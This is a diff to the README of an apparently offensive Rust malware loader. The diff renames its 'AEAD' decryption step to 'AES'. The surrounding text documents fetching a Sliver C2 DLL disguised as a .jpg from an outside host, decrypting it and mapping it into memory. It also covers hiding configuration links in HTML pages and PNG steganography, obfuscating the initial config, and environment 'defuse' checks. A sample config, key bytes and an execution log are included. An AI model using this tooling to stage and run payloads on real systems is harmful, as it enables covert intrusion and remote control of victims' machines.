@@ -110,7 +110,7 @@ The way to modify fetch data from link
 - [x] **BASE64**
 - [x] **ROT13**
 - [x] **WEBPAGE** -> surrounded data with delimiters, hide data into an HTML response. (steam profile, fake website, forum or whatever)
-- [x] **AEAD** -> encrypt and verify data.
+- [x] **AES** -> encrypt data with AEAD (it's AES-GCM-SIV, cf: https://docs.rs/aes-gcm-siv/latest/aes_gcm_siv/index.html
 - [x] **STEGANO** -> hide data in png (jpg seems not to work)
 - [x] **REVERSE** -> todo!()
 - [x] **ZLIB**
@@ -138,7 +138,7 @@ TODO: IMAGE
 ## Config example
 
 Here, this is the first lines of the config file. The first update configuration link is stored in a HTML page : **gobelin.html** and the second one in **troll.html**.
-Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, the DLL is downloaded with HTTPS and then decrypted+verified with dataoperation:AEAD.
+Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, the DLL is downloaded with HTTPS and then decrypted+verified with dataoperation:AES.
 
 ```
 {
@@ -182,7 +182,7 @@ Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, th
             "url": "https://kaboum.xyz/artdonjon/donjon_dll.jpg",
             "dataoperation": [
               {
-                "AEAD": {
+                "AES": {
                   "key_bytes": [
                     13,
                     48,
@@ -304,7 +304,7 @@ You should follow the instruction to install it, (its docker its ez !)
 
 ## 2. Encrypt payload (optionnal)
 
-Here, you will generate encrypted payloads with AEAD. This is optionnal, you can use paylaod not encrypted or only test with the Banner Payload at first. Because you should know the payload decryption key and auth flag, you should create it before the config.
+Here, you will generate encrypted payloads with AES. This is optionnal, you can use paylaod not encrypted or only test with the Banner Payload at first. Because you should know the payload decryption key and auth flag, you should create it before the config.
 
 Example for a sliver.dll :
 
@@ -385,8 +385,8 @@ Here, all config link of the pool will be fetch one by one in the same order and
 Here you will compile the loader with the initial config file.
 
 - This config initial config `~/.malleable/config/initial.json` when you sign it.
-- encrypted+obfsuscated initial config is store in `~/.malleable/config/initial.json.aead` when you sign it/
-- And this file contains decrypt key + all dataoperation to decrypt the initial config : `~/.malleable/config/initial.json.aead.dataop.rot13b64`
+- encrypted+obfsuscated initial config is store in `~/.malleable/config/initial.json.aes` when you sign it/
+- And this file contains decrypt key + all dataoperation to decrypt the initial config : `~/.malleable/config/initial.json.aes.dataop.rot13b64`
 
 ### 4.1 linux compilation
 
@@ -466,7 +466,7 @@ As you see, the memory number choosen is precise by memory_nb parameter :
             "memory_nb": 1,
             "dataoperation": [
               {
-                "AEAD": {
+                "AES": {
 ```
 
 Then, you should compile the code with the `--features mem1` compilation option
@@ -589,7 +589,7 @@ list: ["DEBUG-W10"], operator: OR }), DomainJoin(DomainJoin { list: ["sevenkingd
 [2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/2 defuse: Hostname(Hostname { list: ["DEBUG-W10"], operator: OR })
 [2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 2/2 defuse: DomainJoin(DomainJoin { list: ["sevenkingdoms.local", "essos.local"], operator: AND })
 [2024-11-13T07:10:24Z INFO  loader] [+] PAYLOADS exec
-[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/1 payload: DllFromMemory(DllFromMemory { link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/donjon_dll.jpg", dataoperation: [AEAD(AeadMaterial { key_bytes: [100, 7, 159, 177, 160, 143, 247, 73, 181, 159, 214, 81, 14, 49, 140, 153, 172, 173, 53, 223, 224, 148, 237, 97, 223, 41, 6, 110, 8, 112, 20, 233], associated_data: [], nonce: 751301581, tag: [105, 138, 234, 91, 135, 162, 172, 126, 187, 13, 130, 83, 80, 91, 3, 137] })], sleep: 0, jitt: 0 }), dll_entrypoint: "DllInstall" })
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/1 payload: DllFromMemory(DllFromMemory { link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/donjon_dll.jpg", dataoperation: [AES(AesMaterial { key_bytes: [100, 7, 159, 177, 160, 143, 247, 73, 181, 159, 214, 81, 14, 49, 140, 153, 172, 173, 53, 223, 224, 148, 237, 97, 223, 41, 6, 110, 8, 112, 20, 233], associated_data: [], nonce: 751301581, tag: [105, 138, 234, 91, 135, 162, 172, 126, 187, 13, 130, 83, 80, 91, 3, 137] })], sleep: 0, jitt: 0 }), dll_entrypoint: "DllInstall" })
 [2024-11-13T07:10:24Z INFO  malleable_rust_loader::link] sleep: 0
 [2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Map DLL in memory
 [2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Retreive DLL entrypoint: DllInstall
